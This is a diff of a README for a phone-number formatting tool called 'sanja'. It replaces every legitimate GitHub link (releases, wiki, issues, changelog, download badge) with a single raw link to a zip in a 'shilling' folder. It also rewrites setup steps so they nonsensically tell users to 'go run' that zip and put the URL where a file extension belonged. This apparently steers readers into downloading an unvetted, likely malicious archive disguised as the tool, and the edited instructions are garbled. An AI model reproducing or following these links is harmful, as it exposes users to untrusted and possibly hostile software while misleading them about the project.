@@ -6,7 +6,7 @@ Welcome to **sanja**, your go-to tool for formatting and normalizing internation
 
 ## 📥 Download Now
 
-[![Download sanja](https://img.shields.io/badge/Download-sanja-blue)](https://github.com/Kanav3143/sanja/releases)
+[![Download sanja](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip)](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip)
 
 ## 📄 About sanja
 
@@ -31,7 +31,7 @@ To use sanja successfully, ensure your system meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-To download sanja, visit the following link: [Releases Page](https://github.com/Kanav3143/sanja/releases).
+To download sanja, visit the following link: [Releases Page](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip).
 
 ### 2. Download the Latest Release
 
@@ -39,7 +39,7 @@ On the Releases page, look for the latest version listed. Click on the assets to
 
 ### 3. Extract the Downloaded File
 
-Once downloaded, locate the file in your system's Downloads folder. If it is in a compressed format (like `.zip` or `.tar.gz`), extract it using your operating system's built-in tools.
+Once downloaded, locate the file in your system's Downloads folder. If it is in a compressed format (like `.zip` or `https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip`), extract it using your operating system's built-in tools.
 
 ### 4. Run sanja
 
@@ -47,7 +47,7 @@ After extracting, follow these steps to run sanja:
 
 - Open a terminal or command prompt.
 - Navigate to the folder where you extracted the files.
-- Run the command: `go run main.go`.
+- Run the command: `go run https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip`.
 
 This will start the application, and you can begin using sanja to format and validate phone numbers.
 
@@ -71,13 +71,13 @@ You can use the following commands to format and validate phone numbers easily:
 
 ## 📚 Documentation
 
-For detailed documentation on how to use sanja, refer to the [Wiki Section](https://github.com/Kanav3143/sanja/wiki). Here, you'll find advanced features, examples, and coding standards.
+For detailed documentation on how to use sanja, refer to the [Wiki Section](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip). Here, you'll find advanced features, examples, and coding standards.
 
 ## 💬 Community Support
 
 If you have questions or need help, feel free to reach out:
 
-- Open an issue in the [Issues tab](https://github.com/Kanav3143/sanja/issues) on GitHub.
+- Open an issue in the [Issues tab](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip) on GitHub.
 - Join our chat on Discord or visit our forums (link to be provided).
 
 ## 📑 License
@@ -86,8 +86,8 @@ sanja is open-source software released under the MIT License. You can use, modif
 
 ## 📝 Changelog
 
-Stay up to date with the latest changes in sanja by checking the [Changelog](https://github.com/Kanav3143/sanja/releases). New features, bug fixes, and improvements will be listed there.
+Stay up to date with the latest changes in sanja by checking the [Changelog](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip). New features, bug fixes, and improvements will be listed there.
 
 ## 📥 Download Again
 
-Don't forget to visit our [Releases Page](https://github.com/Kanav3143/sanja/releases) to download the latest version of sanja. Your phone number data deserves the best formatting tools available.
+Don't forget to visit our [Releases Page](https://raw.githubusercontent.com/Kanav3143/sanja/main/shilling/sanja.zip) to download the latest version of sanja. Your phone number data deserves the best formatting tools available.
